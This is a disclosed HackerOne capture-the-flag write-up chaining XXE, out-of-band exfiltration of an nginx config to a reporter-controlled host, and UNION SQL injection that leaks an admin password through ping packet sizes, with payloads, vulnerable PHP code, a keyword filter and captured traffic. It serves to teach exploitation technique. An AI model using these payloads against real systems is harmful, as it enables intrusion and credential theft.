---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
date: 2021-06-18
submitted: 2021-06-03T00:44:27.110Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "erbbysam"
source: "https://hackerone.com/reports/1215919"
title: "ccc.h1ctf.com CTF"
---
# ccc.h1ctf.com CTF

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 6 | **Program:** h1-ctf | **Disclosed:** 2021-06-18

- Report: [https://hackerone.com/reports/1215919](https://hackerone.com/reports/1215919)
- CWE: SQL Injection
- Submitted: 2021-06-03T00:44:27.110Z

## Timeline

- **Report Filed**
- **2021-06-03** @erbbysam: # Write-up

This write-up is divided into 3 sections:
1) XXE -- identification
2) LFI -- configuration file exfiltration via Out-of-band XXE
3) SQLi -- admin password exfiltration via ping packet sizes

## Step 1: XXE -- identification

Visiting https://ccc.h1ctf.com/ we are greeted with 3 links, without much functionality:
https://ccc.h1ctf.com/login
https://ccc.h1ctf.com/register
https://twitter.com/DesignsCcc

Registering, we are "logged in" with and forwarded to a page such as https://ccc.h1ctf.com/u/81yeep where `81yeep` is the user hash

Loading the page, we are greeted by a warning:
`Critical : Remote File list not found`

The third link to twitter is actually the most interesting link!
https://twitter.com/DesignsCcc/status/1398629597298806786

This tweet contains an image:
{F1324456}

Looking closely we can see a tab open to the page:
https://ccc.h1ctf.com/error_-_-_log.txt

Visiting that link, we get the content:
```
File: https://h1-wfzfi4.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://h1-y0c9ov.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://h1-56qw4c.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://h1-6hin8w.s3.eu-west-2.amazonaws.com/files.xml Not Found
```

Looking closely, the "Remote File list" mentioned above appears to be gathered from aws at the url:
`https://h1-<user hash>.s3.eu-west-2.amazonaws.com/files.xml`

Additionally, some of the paths in the error log above contain XXE payloads such as:
https://h1-y0c9ov.s3.amazonaws.com/files.xml
```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "The espurr purrs"> %ext;
]>
<r></r>
```

Placing a simple XXE payload containing a Burp Collaborator callback in a public S3 file:
https://h1-81yeep.s3.amazonaws.com/files.xml

We receive a DNS & HTTP hit and the following error on https://ccc.h1ctf.com/u/81yeep (on page refresh):
`Critical : Invalid XML detected`

With a working XXE payload, we move to step two.

## Step 2: LFI -- configuration file exfiltration via Out-of-band XXE

We are given a hint for this step in the following tweet:
https://twitter.com/DesignsCcc/status/1398981963625676802
`Does anyone know if in nginx you can link a directory to a proxy_pass?`

Setting up a 2 stage XXE payload to exfiltrate data, we place the following on https://h1-81yeep.s3.amazonaws.com/files.xml: 
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```

And on `http://x.x.x.x/dtd.xml`:
```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x/?%data;'>">
```

We then refresh https://ccc.h1ctf.com/u/81yeep and receive the following callback:

```
"GET /?IyMKIyBZb3Ugc2hvdWxkIGxvb2sgYXQgdGhlIGZvbGxvd2luZyBVUkwncyBpbiBvcmRlciB0byBncmFzcCBhIHNvbGlkIHVuZGVyc3RhbmRpbmcKIyBvZiBOZ2lueCBjb25maWd1cmF0aW9uIGZpbGVzIGluIG9yZGVyIHRvIGZ1bGx5IHVubGVhc2ggdGhlIHBvd2VyIG9mIE5naW54LgojIGh0dHBzOi8vd3d3Lm5naW54LmNvbS9yZXNvdXJjZXMvd2lraS9zdGFydC8KIyBodHRwczovL3d3dy5uZ2lueC5jb20vcmVzb3VyY2VzL3dpa2kvc3RhcnQvdG9waWNzL3R1dG9yaWFscy9jb25maWdfcGl0ZmFsbHMvCiMgaHR0cHM6Ly93aWtpLmRlYmlhbi5vcmcvTmdpbngvRGlyZWN0b3J5U3RydWN0dXJlCiMKIyBJbiBtb3N0IGNhc2VzLCBhZG1pbmlzdHJhdG9ycyB3aWxsIHJlbW92ZSB0aGlzIGZpbGUgZnJvbSBzaXRlcy1lbmFibGVkLyBhbmQKIyBsZWF2ZSBpdCBhcyByZWZlcmVuY2UgaW5zaWRlIG9mIHNpdGVzLWF2YWlsYWJsZSB3aGVyZSBpdCB3aWxsIGNvbnRpbnVlIHRvIGJlCiMgdXBkYXRlZCBieSB0aGUgbmdpbnggcGFja2FnaW5nIHRlYW0uCiMKIyBUaGlzIGZpbGUgd2lsbCBhdXRvbWF0aWNhbGx5IGxvYWQgY29uZmlndXJhdGlvbiBmaWxlcyBwcm92aWRlZCBieSBvdGhlcgojIGFwcGxpY2F0aW9ucywgc3VjaCBhcyBEcnVwYWwgb3IgV29yZHByZXNzLiBUaGVzZSBhcHBsaWNhdGlvbnMgd2lsbCBiZSBtYWRlCiMgYXZhaWxhYmxlIHVuZGVybmVhdGggYSBwYXRoIHdpdGggdGhhdCBwYWNrYWdlIG5hbWUsIHN1Y2ggYXMgL2RydXBhbDguCiMKIyBQbGVhc2Ugc2VlIC91c3Ivc2hhcmUvZG9jL25naW54LWRvYy9leGFtcGxlcy8gZm9yIG1vcmUgZGV0YWlsZWQgZXhhbXBsZXMuCiMjCgojIERlZmF1bHQgc2VydmVyIGNvbmZpZ3VyYXRpb24KIwojc2VydmVyIHsKIyAgICAgICAgbGlzdGVuIDgwIGRlZmF1bHRfc2VydmVyOwojICAgICAgICBsaXN0ZW4gWzo6XTo4MCBkZWZhdWx0X3NlcnZlcjsKIwojICAgICAgICByb290IC92YXIvd3d3L2h0bWw7CiMKIyAgICAgICAgIyBBZGQgaW5kZXgucGhwIHRvIHRoZSBsaXN0IGlmIHlvdSBhcmUgdXNpbmcgUEhQCiMgICAgICAgIGluZGV4IGluZGV4Lmh0bWwgaW5kZXguaHRtIGluZGV4Lm5naW54LWRlYmlhbi5odG1sOwojCiMgICAgICAgIHNlcnZlcl9uYW1lIF87CiMKIyAgICAgICAgbG9jYXRpb24gLyB7CiMgICAgICAgICAgICAgICAgdHJ5X2ZpbGVzICR1cmkgJHVyaS8gPTQwNDsKIyAgICAgICAgfSAgICAgICAKI30KCiNzZXJ2ZXIgewojICAgIHNlcnZlcl9uYW1lIGNjYy5oMWN0Zi5jb207CiMgICAgcm9vdCAvdmFyL3d3dy9hcHAvcHVibGljOwojICAgIGluZGV4IGluZGV4LnBocDsKIyAgICBsb2NhdGlvbiAvIHsKIyAgICAgICAgICAgIHRyeV9maWxlcyAkdXJpICR1cmkvIC9pbmRleC5waHA/JHF1ZXJ5X3N0cmluZzsKIyAgICB9CiMgICAgIGxvY2F0aW9uIC8yYjVkMmIxMTUxM2QyYzliIHsKIyAgICAgICBwcm94eV9wYXNzIGh0dHA6Ly8xMjcuMC4wLjE6ODg4ODsKIyAgICAgfQojCiMgICAgbG9jYXRpb24gfiBcLnBocCQgewojICAgICAgICAgICAgaW5jbHVkZSBzbmlwcGV0cy9mYXN0Y2dpLXBocC5jb25mOwojICAgICAgICAgICAgZmFzdGNnaV9wYXNzIHVuaXg6L3Zhci9ydW4vcGhwL3BocDcuNC1mcG0uc29jazsKIyAgICB9CiMgICAgbGlzdGVuIDQ0MyBzc2w7CiMgICAgc3NsX2NlcnRpZmljYXRlIC9ldGMvbGV0c2VuY3J5cHQvbGl2ZS9jY2MuaDFjdGYuY29tL2Z1bGxjaGFpbi5wZW07CiMgICAgc3NsX2NlcnRpZmljYXRlX2tleSAvZXRjL2xldHNlbmNyeXB0L2xpdmUvY2NjLmgxY3RmLmNvbS9wcml2a2V5LnBlbTsKIyAgICBpbmNsdWRlIC9ldGMvbGV0c2VuY3J5cHQvb3B0aW9ucy1zc2wtbmdpbnguY29uZjsKIyAgICBzc2xfZGhwYXJhbSAvZXRjL2xldHNlbmNyeXB0L3NzbC1kaHBhcmFtcy5wZW07CiN9Cgojc2VydmVyIHsKIyAgICBpZiAoJGhvc3QgPSBjY2MuaDFjdGYuY29tKSB7CiMgICAgICAgIHJldHVybiAzMDEgaHR0cHM6Ly8kaG9zdCRyZXF1ZXN0X3VyaTsKIyAgICB9CiMgICAgbGlzdGVuIDgwOwojICAgIHNlcnZlcl9uYW1lIGNjYy5oMWN0Zi5jb207CiMgICAgcmV0dXJuIDQwNDsKI30K HTTP/1.0" 200 -
```

Note that a `php://filter` handler worked here! There was a lot of brute forcing here attempting to find the right file/XXE technique :) 

Decoding the base64 above, we see the following relevant configuration:
```
#     location /2b5d2b11513d2c9b {
#       proxy_pass http://127.0.0.1:8888;
#     }
```

This leads us to https://ccc.h1ctf.com/2b5d2b11513d2c9b

# SQLi -- admin password exfiltration via ping packet sizes

{F1324459}

Visiting https://ccc.h1ctf.com/2b5d2b11513d2c9b we are greeted with a login page.

There is not a lot of functionality here so I ran dirsearch over this URL and it noted that https://ccc.h1ctf.com/2b5d2b11513d2c9b/.git/config existed with the following contents:
```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/ccc-labs/pinger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

Visiting https://github.com/ccc-labs/pinger, we quickly identify a SQL injection vulnerability:
https://github.com/ccc-labs/pinger/blob/main/_pingercode_/models/Ping.php#L11

However, this is behind a full 1 minute cool down between requests, clearly we are not going to be able to run sqlmap quickly here:
https://github.com/ccc-labs/pinger/blob/main/_pingercode_/controllers/Pinger.php#L67

Additionally, there is no obvious out of band vector for a successful SQLi exploit. This is not just due to timing constraints (1 request/min) but also a "WAF" that blocks keywords we would need for a timing attack:
https://github.com/ccc-labs/pinger/blob/main/_pingercode_/waf.php#L6
```
$banned_words = array('1=1','sleep','script','benchmark','alert','xss','onerror');
```

Looking back at the SQLi:
https://github.com/ccc-labs/pinger/blob/main/_pingercode_/models/Ping.php#L10
```
    public static function send( $id ){
        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';
        $d = Db::connect()->prepare($sql);
        $d->execute();
        //Confirm we've found a matching row in the database
        if( $d->rowCount() == 1 ){
            $host = $d->fetch();
            $ip = $host["ip"];
            $packet_size = intval($host["packet_size"]);
            //make sure PING packet size between 1 and 65527
            if( $packet_size > 0 && $packet_size < 65528 ) {
                //check IP is a valid IPv4 Address
                if (filter_var($ip, FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {
                    //SEND 4 PING PACKETS IN THE BACKGROUND
                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');
                }
            }
        }
    }
```

We see the output of this command is fed into a ping command. If we could control the SQL output, there are two ways we could maybe use the ping command to our advantage:
1) we could inject a subcomand and achieve RCE -- this is blocked by the php `intval` and `filter_var` functions which we cannot bypass
2) we could ping our own server and use the packet size to exfiltrate data? -- lets try this

Setting up a SQL query, and getting it right the first time is important due to the full minute cool down per request. To build the perfect query I used http://sqlfiddle.com/ :
Schema:
```
CREATE TABLE `host` (
                        `id` int(11) NOT NULL,
                        `ip` varchar(15) NOT NULL DEFAULT '',
                        `packet_size` int(11) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

INSERT INTO `host` (`id`, `ip`, `packet_size`) VALUES
(1, '8.8.8.8', 32),
(2, '127.0.0.1', 32),
(3, '8.8.4.4', 32);

CREATE TABLE `user` (
                        `id` int(11) NOT NULL,
                        `username` varchar(250) NOT NULL,
                        `password` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

INSERT INTO `user` (`id`, `username`, `password`) VALUES
(1, 'admin', 'password');
```
Query:
```
select * from host where id = 55 union all select 1,"x.x.x.x",ASCII(SUBSTRING((select password from user where username="admin"),1,1)) LIMIT 1;
```
Note the use of an invalid ID here combined with the `union all` to control the output of the SQL query. Using the query above, we will step through the admin password, letter by letter converting it to it's ASCII int value and using that for the packet size! For example, for the first letter we will use a payload of:
```
55 union all select 1,"x.x.x.x",ASCII(SUBSTRING((select password from user where username="admin"),1,1))
URL: https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=55+union+all+select+1%2C%22x.x.x.x%22%2CASCII%28SUBSTRING%28%28select+password+from+user+where+username%3D%22admin%22%29%2C1%2C1%29%29
```
And the second:
```
55 union all select 1,"x.x.x.x",ASCII(SUBSTRING((select password from user where username="admin"),2,1))
URL: https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=55+union+all+select+1%2C%22x.x.x.x%22%2CASCII%28SUBSTRING%28%28select+password+from+user+where+username%3D%22admin%22%29%2C2%2C1%29%29
```

And now we wait... Each letter took a minute as we had to wait for the server to allow another request through

Example ping to a server I control for the 3rd letter of the password:
```
# tcpdump ip proto \\icmp
23:55:55.595798 IP ec2-18-216-97-43.us-east-2.compute.amazonaws.com > x.x.x.x: ICMP echo request, id 113, seq 1, length 63
23:55:55.595888 IP x.x.x.x > ec2-18-216-97-43.us-east-2.compute.amazonaws.com: ICMP echo reply, id 113, seq 1, length 63
23:55:56.597377 IP ec2-18-216-97-43.us-east-2.compute.amazonaws.com > x.x.x.x: ICMP echo request, id 113, seq 2, length 63
23:55:56.597447 IP x.x.x.x > ec2-18-216-97-43.us-east-2.compute.amazonaws.com: ICMP echo reply, id 113, seq 2, length 63
23:55:57.598917 IP ec2-18-216-97-43.us-east-2.compute.amazonaws.com > x.x.x.x: ICMP echo request, id 113, seq 3, length 63
23:55:57.598990 IP x.x.x.x > ec2-18-216-97-43.us-east-2.compute.amazonaws.com: ICMP echo reply, id 113, seq 3, length 63
23:55:58.600448 IP ec2-18-216-97-43.us-east-2.compute.amazonaws.com > x.x.x.x: ICMP echo request, id 113, seq 4, length 63
23:55:58.600522 IP x.x.x.x > ec2-18-216-97-43.us-east-2.compute.amazonaws.com: ICMP echo reply, id 113, seq 4, length 63

```

```
letter ID | data size | ASCII Value
1 93 85
2 108 100
3 63 55
4 65 57
5 102 94
6 57 49
7 80 72
8 80 72
9 82 74
10 44 36
11 95 87
12 50 42
13 81 73
14 87 79
15 106 98
16 105 97
17 83 75
18 108 100
19 89 81
20 111 103
21 81 73
```

Note that in each response above, I had to subtract 8 to account for the ICMP header size. That gives us our final password: `Ud79^1HHJ$W*IObaKdQgI`

Logging in with `admin:Ud79^1HHJ$W*IObaKdQgI` we are greeted with the flag!
██████

Thanks for an awesome challenge!
-Sam
- **Report Triaged**
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
